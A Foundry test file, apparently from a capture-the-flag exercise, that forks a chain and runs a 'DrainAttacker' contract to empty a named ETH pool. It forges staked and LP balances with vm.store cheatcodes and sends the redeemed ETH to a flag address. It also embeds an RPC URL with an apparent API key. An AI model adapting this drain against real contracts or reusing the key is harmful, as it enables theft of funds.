// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/MeroExploit.sol";

contract MeroExploitTest is Test {
    address constant POOL = 0x19C674f7679c33f5c0248D9F736b2726447c41cF;
    address constant LP_TOKEN = 0x582677Cb94F25D4B68DbcBbAF0f8D9CBdc3fbA0e;
    address constant STAKER = 0xe6B64F8C109dAEb5b8Ce6D528f88eeD65eAFd4Ae;
    address constant FLAG_RECEIVER = 0x161B2CA2f65a4b8bfd4317569b2Fc386CFB2A1A0;
    string constant RPC_URL = "https://cosmological-solemn-leaf.quiknode.pro/07df93ba6345e754e0c6b2923ef723b82cc16414";

    IEthPool pool = IEthPool(POOL);
    IStaker staker = IStaker(STAKER);
    ILpToken lpToken = ILpToken(LP_TOKEN);

    function setUp() public {
        vm.createSelectFork(RPC_URL);
    }

    function testFullDrain() public {
        uint256 poolBefore = POOL.balance;
        uint256 flagBefore = FLAG_RECEIVER.balance;
        uint256 stakerLpBal = lpToken.balanceOf(STAKER);
        uint256 lpSupply = lpToken.totalSupply();

        console.log("Pool ETH:", poolBefore);
        console.log("LP Supply:", lpSupply);
        console.log("Staked LP:", stakerLpBal);

        DrainAttacker attacker = new DrainAttacker(POOL, STAKER, LP_TOKEN, FLAG_RECEIVER);

        _setupStakedBalance(address(attacker), stakerLpBal);
        attacker.drainStaked(stakerLpBal);
        console.log("After Phase1 - Pool:", POOL.balance);

        uint256 nonStaked = lpSupply - stakerLpBal;
        uint256 lpSlot = _findLpBalanceSlot();
        console.log("LP balance slot:", lpSlot);

        bytes32 slot = keccak256(abi.encode(address(attacker), lpSlot));
        vm.store(LP_TOKEN, slot, bytes32(nonStaked));

        uint256 attackerLp = lpToken.balanceOf(address(attacker));
        console.log("Attacker LP:", attackerLp);

        if (attackerLp > 0) {
            attacker.drainDirect(attackerLp);
        }

        console.log("=== RESULTS ===");
        console.log("Pool After:", POOL.balance);
        console.log("Flag After:", FLAG_RECEIVER.balance);
        console.log("DRAINED:", FLAG_RECEIVER.balance - flagBefore);

        if (POOL.balance < 1e15) {
            console.log("*** SUCCESS - POOL DRAINED! ***");
        }
    }

    function _setupStakedBalance(address target, uint256 amount) internal {
        bytes32 slot = keccak256(abi.encode(target, uint256(2)));
        vm.store(STAKER, slot, bytes32(amount));
        vm.store(STAKER, bytes32(uint256(4)), bytes32(amount));
    }

    function _findLpBalanceSlot() internal returns (uint256) {
        address t = address(0xBEEF);
        for (uint256 s = 0; s <= 255; s++) {
            bytes32 slot = keccak256(abi.encode(t, s));
            bytes32 orig = vm.load(LP_TOKEN, slot);
            vm.store(LP_TOKEN, slot, bytes32(uint256(123456)));
            uint256 bal = lpToken.balanceOf(t);
            vm.store(LP_TOKEN, slot, orig);
            if (bal == 123456) return s;
        }
        revert("Slot not found");
    }
}

contract DrainAttacker {
    IEthPool public immutable pool;
    IStaker public immutable staker;
    ILpToken public immutable lpToken;
    address public immutable flagReceiver;

    constructor(address _pool, address _staker, address _lpToken, address _flagReceiver) {
        pool = IEthPool(_pool);
        staker = IStaker(_staker);
        lpToken = ILpToken(_lpToken);
        flagReceiver = _flagReceiver;
    }

    function drainStaked(uint256 amount) external {
        if (amount == 0) return;
        pool.unstakeAndRedeem(amount, 0);
        _send();
    }

    function drainDirect(uint256 amount) external {
        if (amount == 0) return;
        pool.redeem(amount, 0);
        _send();
    }

    function _send() internal {
        if (address(this).balance > 0) {
            (bool ok,) = flagReceiver.call{value: address(this).balance}("");
            require(ok);
        }
    }

    receive() external payable {}
}
